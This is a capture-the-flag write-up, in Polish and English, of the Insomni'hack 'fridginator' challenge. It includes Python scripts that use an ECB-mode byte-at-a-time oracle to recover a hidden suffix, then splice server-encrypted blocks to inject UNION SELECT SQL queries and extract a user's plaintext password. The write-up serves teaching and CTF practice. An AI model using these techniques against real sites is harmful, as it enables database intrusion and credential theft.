## fridginator (crypto/web, 200p)

> my brother john just bought this high-tech fridge which is all flashy and stuff,
> but has also added some kind of security mechanism which means i can't steal his
> food anymore... i'm not sure i can survive much longer without his amazing yoghurts.
> can you find a way to steal them for me?
> http://fridge.insomnihack.ch/

### pl
[eng](#eng-version)

łączymy się ze wskazanym adresem. trzeba zarejestrować swojego użytkownika.

zaczynamy od sprawdzenia co możemy zrobić. możemy dodawać 'jedzenie' do lodówki, wyciągać swoje jedzenie, oraz wyszukiwać użytkowników i jedzenie.


[image extracted text: main door
add food
close fridge
search for users
search for food
search terms
search
search terms
search]


ta ostatnia opcja wydaje się ciekawa, ponieważ oba pola wyszukiwania prowadzą ostatecznie do bardzo podobnej strony. wyszukanie użytkownika 'aaa' redirectuje do:

http://fridge.insomnihack.ch/search/c5c376484a22a1a196ced727b32c05ce706fa0919a8b040b2a2ba335c7c45726/

a wyszukanie jedzenia 'aaa' redirectuje do:

http://fridge.insomnihack.ch/search/c5c376484a22a1a196ced727b32c05ceed1a8d4636d71c65dcf1bca14dac7665/

nasza myśl (jak później się okazało - prawie trafna): być może parametr do search to zaszyfrowane jakimś szyfrem blokowym zapytanie sql.

długość bloku to 16 bajtów - można to sprawdzić, bo szyfrowanie 0123456789abcd daje w wyniki:

    b15fd5ffdae30bbe81f2ba9ec6930473b57ceb7611442a1380e2845a9b916405

a już zaszyfrowanie 0123456789abcde (15 znaków) daje:

    b15fd5ffdae30bbe81f2ba9ec6930473cce0dd7d051074345c5a8090ba39d24cb9719c83f5ab5c0751937a39150c920d

mamy już jedną informację. teraz możemy sprawdzić czy bloki są w jakiś sposób przeplatane (ctr, cbc), czy szyfrowane niezależnie (ecb):

zaszyfrowanie aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa daje nam w wyniku:

    5616962f8384b4f8850d8cd1c0adce98 e449af7ccbc7f34f2f1976a5fbfeb93f e449af7ccbc7f34f2f1976a5fbfeb93f e449af7ccbc7f34f2f1976a5fbfeb93f 04ea1913c8d3e7f30d2626ee9dfeff07 f1ad77dcff3212b1a5f83d230610d845

wyraźnie widać powtarzający się blok na środku (więc mamy do czynienia z ecb), ale pierwszy i ostatni blok się różnią (więc do danych jest doklejany jakiś prefiks i sufiks).

pierwszą rzeczą jaką zrobiliśmy, było napisanie "fuzzera" do zaszyfrowanych danych - gdyż byliśmy ciekawi co powiedzą nam błędy. kod jest mało ciekawy (podany w [pliku fuzzer.py](fuzzer.py)), ale wyniki bardziej - spośród wyfuzzowanych kilkuset błedów, najciekawsze dwa:

    <p> error : no such table: objsearch_user♠ </p>
    <p> error : unrecognized token: &quot;&#39;i where description like ?&quot; </p>

ok, mamy już jakieś dane. co teraz? wpadliśmy na to, że można wyciągnąć "sufiks" który jest doklejany do naszych danych przed szyfrowaniem - bajt po bajcie.

jak konkretnie to zrobić - wiemy że dane są szyfrowane blok po bloku. oznaczając przez [xxxxxxxxx] bloki, (i przez 'a' payload) zaszyfrowane dane wyglądają mniej więcej tak:

    [prefixaaaaa][aaaaaaaaaa][aaaaaaaaaa][aaaaaaasuf][fix_______]

ale jeśli wyślemy odpowiednio długi content, możemy otrzymać taki układ:

    [prefixaaaaa][aaaaaaaaaa][aaaaaaaaaa][aaaaaaaaas][uffix_____]

co nam to daje - że czwarty blok tak zaszyfrowanych danych skłąda się z 15 znaków 'a', oraz pierwszego bajtu payloadu.
wystarczy przebrutować około 100 printowalnych znaków ascii, i sprawdzić który z nich szyfruje się do tego samego bloku co ten powyżej, i mamy pierwszy znak sufiksu. a później powtarzać aż poznamy cały sufiks.

napisaliśmy do tego taki skrypt (dość skomplikowany, ponieważ trzeba było zaimplementować szyfrowanie przez stronę):

```python
import requests
import time
import string

prefx_len = 7
sufx_len = 11

def encrypt(payload):
    sessid = 'ln8h6x5zwp6oj2e7kz6zd45hlu97q3yp'
    cookies = {'sessionid': sessid}
    cookies['awselb'] = '033f977f02d671bce8d4f0e661d7ca8279d94e64ef1bd84608db9ffa0fc0f2f4f304ac9cd30cdcc86788a845df98a68a77d605b8bf768114d93228aacfb536de3963e28f295d0c2d52138ba1520672bb1428b11124'
    url0 = 'http://fridge.insomnihack.ch/'

    base = requests.get(url0, cookies=cookies)
    text = base.text

    csrf = "<input type='hidden' name='csrfmiddlewaretoken' value='"
    start = text.find(csrf) + len(csrf)
    token = text[start:start+32]
    cookies['csrftoken'] = token

    url = 'http://fridge.insomnihack.ch/users/'
    resp = requests.post(url, data={'term': payload, 'csrfmiddlewaretoken': token}, cookies=cookies, allow_redirects=false)
    prefx = '/search/'
    loc = resp.headers['location']
    return loc[len(prefx):-1]


prefx = 'p' * prefx_len
known_suffix = ''
for i in range(sufx_len):
    content_len = 48 - prefx_len - len(known_suffix) - 1
    content = 'a' * content_len

    crypted = encrypt(content)
    crypted_chunks = chunks(crypted, 32)
    print crypted_chunks
    sought = crypted_chunks[-2]
    print 'sought', i, sought

    for c in [chr(x) for x in range(256)]:
        payload = content + known_suffix + c
        decrypted = encrypt(payload)
        decrypted_chunks = chunks(decrypted, 32)
        print decrypted_chunks
        result = decrypted_chunks[-2]
        if result == sought:
            print 'got', c
            known_suffix += c
            print known_suffix
            break
```

sufiks który otrzymaliśmy to:

    |type=user

jesteśmy w domu. bo patrząc na błędy które otrzymaliśmy, ten typ jest doklejany bezpośrednio do zapytania - więc możemy zrobić sqli, jeśli tylko nauczymy się jak "dokleić" coś na koniec zaszyfrowanego tekstu.

a możemy spokojnie dokleić coś na koniec ciphertextu, o ile długość ciphertextu jest wielokrotnością 16 bajtów - obrazowo:

    [prefixaaaaa][aaaaaaaaaa][aaaaaaaaaa][aa|type=user][ where 1=1 --]

spowoduje wykonanie zapytania w rodzaju

    select (?) from objsearch_user where 1=1 -- ???

idealnie.

a blok `[ where 1=1 --]` (i dowolny inny) możemy spokojnie zaszyfrować - zrobi to za nas strona. 
wystarczy, że sqli które chcemy zaszyfrować będzie wypełniać całkowicie kilka następujących po sobie bloków. 
wynika to ze słabości ecb - blok plaintextu zawsze jest szyfrowany do tej samej postaci, bez względu na położenie.
potrzebujemy jedynie dopełnić blok z prefixem (9 bajtów) a potem dodać na końcu naszego sqli padding (np. spacje), tak żeby suffix dodawany przez serwer trafił w całości do ostaniego bloku:

    [prefix123456789][sqli part1]...[sqli partn     ][|type=user]

wysyłając taki payload otrzymamy w wyniku n+2 bloki. pierwszy i ostatni blok odrzucamy bo zawierają tylko prefix i suffix od serwera, a wszystkie pozostałe zawierają nasz kod.
możemy je teraz wstawić pomiędzy dowolne inne bloki a serwer zdekoduje je i doklei w odpowiednie miejsce.

jest tylko jedna pułapka - padding. dane szyfrowane szyfrem blokowym muszą mieć długośc równą wielokrotności 16 bajtów. co jeśli są krótsze?

jeden z popularnych schematów paddingu (konkretnie, pkcs7) działa tak:
* jeśli danym do wielokrotności 16 bajtów brakuje 1 bajta - doklej na koniec '\x01'
* jeśli danym do wielokrotności 16 bajtów brakuje 2 bajtów - doklej na koniec '\x02\x02'
* jeśli danym do wielokrotności 16 bajtów brakuje 3 bajtów - doklej na koniec '\x03\x03\x03'
* ...
* i uwaga, jeśli danym już są wielokrotnością 16 bajtów - doklej na koniec '\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10'

ostatni warunek jest konieczny, żeby deszyfrowanie było zawsze jednoznaczne. tak więc trzeba pamiętać, że ostatni zaszyfrowany blok będzie "fałszywym" blokiem składającym się wyłącznie z bajtów 0x10, i musimy go pominąć a później dokleić na końcu.

łącząc te wszystkie pomysły, napisaliśmy taki kod [final.py](final.py):

```python
def hack(query):
    parts = encrypt2(query)
    part = ''.join(parts)
    prfx = 'b15fd5ffdae30bbe81f2ba9ec6930473cce0dd7d051074345c5a8090ba39d24c'
    sufx = 'b9719c83f5ab5c0751937a39150c920d'
    return prfx + part + sufx 

def hack2(query):
    payload = hack(query)
    session = '16if76517xm5zvvwn0l09yq8hqwbgdi5'
    cookies = {'sessionid': session}
    cookies[
        'awselb'] = '033f977f02d671bce8d4f0e661d7ca8279d94e64efd0aa7bc023208f4937f97452ef3e07b21cf2698ed17fb3ae4d8a6166a17a44acbc6810bec0739d56bbe463f63cc54bc91275b57e8fe8cbb9b39f65dfaffa27c1'
    url = 'http://fridge.insomnihack.ch/search/'
    r = requests.get(url + payload, cookies=cookies)
    return r.text

def hack3(query):
    return hack2(' union all select 1, (' + query + '), 3, 4, 5 union all select 1, 2, 3, 4, 5 from objsearch_user ')

import sys
print hack3(sys.argv[1])
```

pozwala on trywialnie wykonać dowolne zapytanie na bazie - wygląda na to żę zadanie praktycznie zrobione

jedyne trzy tabele które znaleźliśmy (niestety, nie mamy screenów) to objsearch_user, objsearch_object oraz sqlite_sequence.

wyciągneliśmy więc po prostu ddl dla objsearch_user:

    create table &quot;objsearch_user&quot; (&quot;id&quot; integer not null primary key autoincrement, &quot;username&quot; varchar(200) not null, &quot;description&quot; varchar(2000) not null, &quot;password&quot; varchar(200) not null, &quot;email&quot; varchar(200) not null)

a następnie wyciągneliśmy "password" dla użytkownika "john" - okazało się być plaintextowe:

    superduperpasswordoftheyear!!!

wystarczyło w tym momencie zalogowąć się na użytkownika john i "wyciągnąć" jego jedzenie z lodówki:

    hello johnny, have your food and a flag, because why not? ins{i_do_encryption_so_no_sql_injection}

### eng version

we connect to address specified in task description. 

after registering our user, we check what we can do. we can add 'food' to fridge, took 'food' out, and search for users and food.


[image extracted text: main door
add food
close fridge
search for users
search for food
search terms
search
search terms
search]


last option is particulary interesting, because both search fields directs us to the same page in the end. searching for user named 'aaa' redirects us to:

http://fridge.insomnihack.ch/search/c5c376484a22a1a196ced727b32c05ce706fa0919a8b040b2a2ba335c7c45726/

and searching for food called 'aaa' redirects to:

http://fridge.insomnihack.ch/search/c5c376484a22a1a196ced727b32c05ceed1a8d4636d71c65dcf1bca14dac7665/

our first thought was (and it turned out, we were almost right) - maybe parameter passed to search is encrypted sql query.

it certinally looks like that - block length is 16 bytes, and it can be easily verified. encrypting 0123456789abcd (14 chars) gives us:

    b15fd5ffdae30bbe81f2ba9ec6930473b57ceb7611442a1380e2845a9b916405

and encrypting 0123456789abcde (15 chars):

    b15fd5ffdae30bbe81f2ba9ec6930473cce0dd7d051074345c5a8090ba39d24cb9719c83f5ab5c0751937a39150c920d

so we know something about cipher already. now we can check, if blocks are related in any way (ctr, cbc) or completly independent (ecb):

encrypting aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa gives us:

    5616962f8384b4f8850d8cd1c0adce98 e449af7ccbc7f34f2f1976a5fbfeb93f e449af7ccbc7f34f2f1976a5fbfeb93f e449af7ccbc7f34f2f1976a5fbfeb93f 04ea1913c8d3e7f30d2626ee9dfeff07 f1ad77dcff3212b1a5f83d230610d845

we can clearly see repeating block in the middle (so we are dealing with ecb mode - yay). but first and last blocks are different - so we can conclude that server is adding some secret prefix and suffix to our data (this matches our hypothesis about sql query, by the way).

first thing we did were implementing "fuzzer" for encrypted data (randomly changing last block and checking results) - because we were curious what the errors will be. fuzzer code is not particulary interesting (you can find it in [fuzzer.py file](fuzzer.py)), but it gave us interesing results. especially these two errors catched our eye:

    <p> error : no such table: objsearch_user♠ </p>
    <p> error : unrecognized token: &quot;&#39;i where description like ?&quot; </p>

so we know even more about server operatins. now what? we found out that we can bruteforce 'suffix' appended to our data.

we know that block cipher is used. i will denote each encrypted block like `[xxxxxxxxx]`. so encrypted request looks like this:

    [prefixaaaaa][aaaaaaaaaa][aaaaaaaaaa][aaaaaaasuf][fix_______]

but, when we use long enough content, we can get something like this:

    [prefixaaaaa][aaaaaaaaaa][aaaaaaaaaa][aaaaaaaaas][uffix_____]

(only one byte of suffix is inside fourth block). why would we do that? because now we can bruteforca all possible bytes, and check when encrypting "aaaaaaaaaa" + (next byte) gives the same result that encrypting "aaaaaaaa" + (first byte of suffix).

now we created another script, used to get entire suffix:

```python
import requests
import time
import string

prefx_len = 7
sufx_len = 11

def encrypt(payload):
    sessid = 'ln8h6x5zwp6oj2e7kz6zd45hlu97q3yp'
    cookies = {'sessionid': sessid}
    cookies['awselb'] = '033f977f02d671bce8d4f0e661d7ca8279d94e64ef1bd84608db9ffa0fc0f2f4f304ac9cd30cdcc86788a845df98a68a77d605b8bf768114d93228aacfb536de3963e28f295d0c2d52138ba1520672bb1428b11124'
    url0 = 'http://fridge.insomnihack.ch/'

    base = requests.get(url0, cookies=cookies)
    text = base.text

    csrf = "<input type='hidden' name='csrfmiddlewaretoken' value='"
    start = text.find(csrf) + len(csrf)
    token = text[start:start+32]
    cookies['csrftoken'] = token

    url = 'http://fridge.insomnihack.ch/users/'
    resp = requests.post(url, data={'term': payload, 'csrfmiddlewaretoken': token}, cookies=cookies, allow_redirects=false)
    prefx = '/search/'
    loc = resp.headers['location']
    return loc[len(prefx):-1]


prefx = 'p' * prefx_len
known_suffix = ''
for i in range(sufx_len):
    content_len = 48 - prefx_len - len(known_suffix) - 1
    content = 'a' * content_len

    crypted = encrypt(content)
    crypted_chunks = chunks(crypted, 32)
    print crypted_chunks
    sought = crypted_chunks[-2]
    print 'sought', i, sought

    for c in [chr(x) for x in range(256)]:
        payload = content + known_suffix + c
        decrypted = encrypt(payload)
        decrypted_chunks = chunks(decrypted, 32)
        print decrypted_chunks
        result = decrypted_chunks[-2]
        if result == sought:
            print 'got', c
            known_suffix += c
            print known_suffix
            break
```

and the result was (this is the suffix that server appends to our message):

    |type=user

now we are talking. looking at error messages we got earlier, it is clear that this "type" is appended to sql query directly - so we could do textbook sql injection with this field. if only we could append something to encrypted text...

and it turns out we can! imagine that length of ciphertext is multiple of 16 bytes:

    [prefixaaaaa][aaaaaaaaaa][aaaaaaaaaa][aa|type=user]

we can append block with encrypted `[ where 1=1 --]` to the end, and the result will be:

    [prefixaaaaa][aaaaaaaaaa][aaaaaaaaaa][aa|type=user][ where 1=1 --]

and it will cause following query to be executed:

    select (?) from objsearch_user where 1=1 -- ???

great. now we need to get our sqli code in the form of ecnrypted blocks so we can append them somewhere.
we can do this easily using the server itself for encryption, as long as our code will be filling entirely consecutive encryption blocks.
this is a weakness of ecb encryption mode - plaintext block is always encrypted into the same cipher block, regardless of the position in input.
we need only to fill the prefix block (missing 9 bytes) and then add some padding (eg. spaces) to our sqli so that the server suffix ends up in the last block:

    [prefix123456789][sqli part1]...[sqli partn     ][|type=user]

by sending such payload we will get n+2 blocks. first one contains prefix and our filling, last one only suffix, and all the rest contain our encrypted sqli code.
now we can put those blocks in between any other blocks and the server will decrypt them and glue in this place.

one last think we have to watch out - padding. length of data encrypted with block cipher must be multiple of 16 bytes, always. what if we are encrypting something shorter? that's when padding comes in:

one of popular padding schemes (pkcs7 to be precise) works as follows:
* if last block is 1 byte short of 16 bytes, append '\x01' to the end
* if last block is 2 bytes short of 16 bytes, append '\x02\x02' to the end
* if last block is 3 bytes short of 16 bytes, append '\x03\x03\x03' to the end
* ...
* and, important: if length of ciphertext is exactly multiple of 16 bytes, append '\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10'

last condition is necessary, because otherwise we cannot uniquely remove padding. so we have to remember that even though data we are encrypting is multiple of 16 bytes, last block will be phony block consisting only of 0x10 bytes, and we will have to append it after processing.

finally, merging all these ideas, we wrote following tool: [final.py](final.py):

```python
def hack(query):
    parts = encrypt2(query)
    part = ''.join(parts)
    prfx = 'b15fd5ffdae30bbe81f2ba9ec6930473cce0dd7d051074345c5a8090ba39d24c'
    sufx = 'b9719c83f5ab5c0751937a39150c920d'
    return prfx + part + sufx 

def hack2(query):
    payload = hack(query)
    session = '16if76517xm5zvvwn0l09yq8hqwbgdi5'
    cookies = {'sessionid': session}
    cookies[
        'awselb'] = '033f977f02d671bce8d4f0e661d7ca8279d94e64efd0aa7bc023208f4937f97452ef3e07b21cf2698ed17fb3ae4d8a6166a17a44acbc6810bec0739d56bbe463f63cc54bc91275b57e8fe8cbb9b39f65dfaffa27c1'
    url = 'http://fridge.insomnihack.ch/search/'
    r = requests.get(url + payload, cookies=cookies)
    return r.text

def hack3(query):
    return hack2(' union all select 1, (' + query + '), 3, 4, 5 union all select 1, 2, 3, 4, 5 from objsearch_user ')

import sys
print hack3(sys.argv[1])
```

it allows us to trivially execute any sql query on database - looks like we managed to solve challenge.

we found three tables in database: objsearch_user, objsearch_object and sqlite_sequence.

so we just queried sqlite_master for ddl for objsearch_user:

    create table &quot;objsearch_user&quot; (&quot;id&quot; integer not null primary key autoincrement, &quot;username&quot; varchar(200) not null, &quot;description&quot; varchar(2000) not null, &quot;password&quot; varchar(200) not null, &quot;email&quot; varchar(200) not null)

and then we queried password for user "john" - it turned out that passwords were stored in plain text!

    superduperpasswordoftheyear!!!

and finally, we logged in into john user and took food from his fridge (like task's description told us to):

    hello johnny, have your food and a flag, because why not? ins{i_do_encryption_so_no_sql_injection}

